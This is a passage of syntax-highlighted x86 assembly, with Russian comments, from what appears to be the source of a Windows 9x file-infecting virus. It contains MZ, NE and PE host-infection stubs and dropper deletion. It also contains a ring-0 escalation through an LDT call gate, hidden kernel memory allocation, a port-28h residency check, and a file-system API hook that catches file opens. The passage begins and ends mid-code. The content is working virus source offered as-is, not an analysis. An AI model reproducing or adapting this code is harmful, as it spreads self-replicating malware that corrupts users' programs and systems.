        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FName</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Удаляем дроппер]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FName</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Отдаем управление файлу-носителю]</span><span class="sc0">

</span><span class="sc5">QuitMZ</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldCSIP</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldSS</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc5">OldSS</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc5">OldSP</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">OldCSIP</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">PBlock</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">5Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">6Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FName</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'DJ.SAD'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">





















</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                     ТРАНЗИТНАЯ ЧАСТЬ ДЛЯ NE-EXE</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">StartNE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Проверяем наличие вируса в памяти]</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABCDh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">QuitNE</span><span class="sc0">


</span><span class="sc1">;[Получаем версию Windows]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1600h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">QuitNE</span><span class="sc0">


</span><span class="sc1">;[Проверяем наличие DPMI]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1686h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">QuitNE</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем вирус в память]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnterR0</span><span class="sc0">


</span><span class="sc1">;[Отдаем управление файлу-носителю]</span><span class="sc0">

</span><span class="sc5">QuitNE</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">ReloCSIP</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">EndCode16</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">Code16</span><span class="sc0">      </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">





















</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                    ТРАНЗИТНАЯ ЧАСТЬ ДЛЯ PE-EXE</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Code32</span><span class="sc0">      </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Code32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Code32</span><span class="sc0">

</span><span class="sc5">Start32</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">StartPE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushfd</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем обработчик исключений]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">QuitPE</span><span class="sc0">
</span><span class="sc5">Seh</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">


</span><span class="sc1">;[Проверяем наличие вируса в памяти]</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABCDh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">QuitPE</span><span class="sc0">


</span><span class="sc1">;[Вычисляем EIP]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Entry3</span><span class="sc0">
</span><span class="sc5">Entry3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Entry3</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc0">


</span><span class="sc1">;[Вычисляем адрес LDT]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sgdt</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sldt</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">QuitPE</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Сохраняем первый дескриптор LDT]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;[Создаем в первом дескрипторе LDT шлюз вызова]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Ring0</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">11101100b</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">


</span><span class="sc1">;[Переходим в нулевое кольцо]</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9Ah</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00000111b</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем первый дескриптор LDT]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;[Отдаем управление файлу-носителю]</span><span class="sc0">

</span><span class="sc5">QuitPE</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Fixup stack</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popfd</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E9h</span><span class="sc0">
</span><span class="sc5">RetAddress</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">





















</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                    ТРАНЗИТНАЯ ЧАСТЬ ДЛЯ RING0</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Ring0</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Вычисляем EIP]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Entry4</span><span class="sc0">
</span><span class="sc5">Entry4</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Entry4</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc0">


</span><span class="sc1">;[Выделяем память]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">MemSize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00010053h</span><span class="sc0">       </span><span class="sc1">; _PageAllocate</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDcall</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Quit</span><span class="sc0">


</span><span class="sc1">;[Сбрасываем флажок занятости]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Busy</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;[Копируем код в память]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Start16</span><span class="sc4">-</span><span class="sc5">EndCode16</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Защищаем страницу от чтения из 3-го кольца]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">20000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00060000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">MemSize</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00010133h</span><span class="sc0">       </span><span class="sc1">; _PageModifyPermisions</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDcall</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем обработчик порта 28h]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">Port28h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">)+(</span><span class="sc5">EndCode16</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">)+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00010096h</span><span class="sc0">       </span><span class="sc1">; Install_IO_Handler</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDcall</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Quit</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем свой обработчик IFS]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">ApiHook</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">)+(</span><span class="sc5">EndCode16</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">)+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00400067h</span><span class="sc0">       </span><span class="sc1">; InstallFileSystemApiHook</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDcall</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">PrevHook</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">)+(</span><span class="sc5">EndCode16</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">)+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc5">Quit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">





















</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                             ОБРАБОТЧИКИ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Port28h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABCDh</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;[Проверяем, какую функцию пытаются выполнить]</span><span class="sc0">

</span><span class="sc5">ApiHook</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0024h</span><span class="sc0">  </span><span class="sc1">; FileOpen</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit1</span><span class="sc0">


</span><span class="sc1">;[Вычисляем EIP]</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Entry5</span><span class="sc0">
</span><span class="sc5">Entry5</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Entry5</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем флажок занятости]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Busy</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Exit2</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Busy</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;[Определяем букву диска]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileName</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc5">Exit3</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Преобразовываем кодировку]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
